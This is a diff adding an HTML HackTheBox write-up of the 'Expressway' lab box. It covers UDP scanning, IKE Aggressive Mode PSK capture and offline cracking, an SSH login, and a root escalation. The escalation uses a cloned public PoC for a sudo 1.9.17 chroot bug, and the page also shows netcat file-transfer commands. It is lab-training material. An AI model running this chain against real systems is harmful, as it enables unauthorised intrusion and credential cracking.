@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Expressway - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Expressway</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Expressway</p>
+        <p><strong>OS:</strong> Linux</p>
+        <p><strong>IP Address:</strong> 10.129.55.71</p>
+    </div>
+
+    <h2>TL;DR</h2>
+    <p>Found only SSH initially, discovered additional UDP services (TFTP, DHCP, IKE). Used an IKE Aggressive-mode capture → psk-crack → recovered the PSK hash. Decrypted the PSK and got a password, SSHed into the machine using the recovered credentials, enumerated, and escalated to root via a sudo vulnerability (sudo 1.9.17) using a public PoC. Root flag recovered at <code>/root/root.txt</code>.</p>
+    <h2>Reconnaissance</h2>
+    <h3>Initial TCP scan</h3>
+    <pre><code>nmap -sC -sV -O -p- 10.129.55.71</code></pre>
+    <p><strong>Notable output:</strong></p>
+    <pre><code>22/tcp open ssh OpenSSH 10.0p2 Debian 8</code></pre>
+    <p>Only SSH initially visible.</p>
+    <div class="shot">
+        <img src="expressway_01.png" alt="nmap TCP scan showing only SSH open"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_01.png</code><br>nmap TCP scan showing only SSH open</div>
+    </div>
+    <h3>UDP discovery</h3>
+    <p>Further UDP scanning revealed several services:</p>
+    <ul>
+        <li>UDP 69 — TFTP (open/filtered)</li>
+        <li>UDP 500 — ISAKMP / IKE (open)</li>
+        <li>UDP 4500 — NAT-T IKE (open/filtered)</li>
+        <li>UDP 68 — DHCP client port (filtered)</li>
+    </ul>
+    <pre><code>sudo nmap -sU 10.129.55.71</code></pre>
+    <div class="shot">
+        <img src="expressway_02.png" alt="UDP scan revealing IKE/ISAKMP on 500"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_02.png</code><br>UDP scan revealing IKE/ISAKMP on 500</div>
+    </div>
+    <h2>IKE / IPsec enumeration &amp; PSK recovery</h2>
+    <h3>Fingerprint &amp; aggressive mode capture</h3>
+    <p>Used <code>ike-scan</code> to probe the gateway and check for Aggressive Mode support:</p>
+    <pre><code>sudo ike-scan -A 10.129.55.71</code></pre>
+    <pre><code>Aggressive Mode Handshake returned ...
+  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) ... Hash(20 bytes)
+  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
+  VID=09002689... (XAUTH)</code></pre>
+    <p>This indicates Aggressive Mode is accepted and returns the values required to crack a PSK offline.</p>
+    <h3>Produce PSK cracking params and crack offline</h3>
+    <pre><code>sudo ike-scan -A -Ppsk_params.txt --nat-t --dport=4500 10.129.55.71
+psk-crack -d /usr/share/wordlists/rockyou.txt psk_params.txt
+key "freakingrockstarontheroad" matches SHA1 hash ...</code></pre>
+    <div class="success">
+    <p><strong>Recovered PSK:</strong> freakingrockstarontheroad</p>
+    </div>
+    <div class="shot">
+        <img src="expressway_03.png" alt="psk-crack recovering the pre-shared key"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_03.png</code><br>psk-crack recovering the pre-shared key</div>
+    </div>
+    <h2>Internal access — SSH to host</h2>
+    <p>The IKE Aggressive-mode handshake revealed an identity (<code>ID_USER_FQDN</code>) for the account <code>ike@expressway</code>. Using the recovered credentials, a direct SSH login was performed with the <code>ike</code> user and the recovered password:</p>
+    <pre><code>ssh ike@10.129.55.71
+whoami; id
+cat /home/ike/user.txt
+# =&gt; user flag captured</code></pre>
+    <p>This direct SSH authentication with the <code>ike</code> account yielded the unprivileged shell and the user flag.</p>
+    <h2>Local enumeration (prior to escalation)</h2>
+    <pre><code>sudo -V
+sudo -l</code></pre>
+    <p>Other methods such as enumerating folders and checking cron jobs yielded no results. <strong>Key findings:</strong></p>
+    <pre><code>Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+
+/usr/local/bin/sudo
+-rwsr-xr-x 1 root root ... /usr/local/bin/sudo</code></pre>
+    <p>The installed sudo version 1.9.17 is known to be vulnerable (fixed in a subsequent patch release). This pointed to a public exploit for the 2025 CVE chain, notably CVE-2025-32462 / CVE-2025-32463 (<code>--chroot</code> related issues).</p>
+    <div class="shot">
+        <img src="expressway_04.png" alt="sudo -V output showing version 1.9.17"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_04.png</code><br>sudo -V output showing version 1.9.17</div>
+    </div>
+    <h2>Privilege escalation — exploit sudo 1.9.17</h2>
+    <div class="highlight">
+    <p><strong>Exploit used:</strong> <code>https://github.com/KaiHT-Ladiant/CVE-2025-32463</code></p>
+    </div>
+    <p>Expressway was running sudo 1.9.17, vulnerable to the 2025 CVE chain. The public PoC from the KaiHT-Ladiant repository was used to exploit the <code>--chroot</code> related vulnerability and obtain a root shell. Always inspect the repo README before executing.</p>
+    <h3>Commands used</h3>
+    <pre><code>cd /tmp
+git clone https://github.com/KaiHT-Ladiant/CVE-2025-32463.git /tmp/CVE-2025-32463
+cd /tmp/CVE-2025-32463
+chmod +x exploit.sh 2&gt;/dev/null || true
+./exploit.sh
+id
+whoami
+cat /root/root.txt</code></pre>
+    <div class="info-box">
+    <p>Note: I built the exploit on my own machine locally and transferred the file using NetCat.</p>
+    <pre><code>nc -lvp 8080 &gt; cve.sh          # Target machine
+nc 10.129.55.71 8080 &lt; cve.sh  # Host machine</code></pre>
+    </div>
+    <div class="shot">
+        <img src="expressway_05.png" alt="Root shell spawned by the sudo 1.9.17 PoC + root flag"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_05.png</code><br>Root shell spawned by the sudo 1.9.17 PoC + root flag</div>
+    </div>
+    <h3>Result</h3>
+    <p>Running the KaiHT-Ladiant PoC spawned a root shell on the host. The root flag was read from <code>/root/root.txt</code>.</p>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
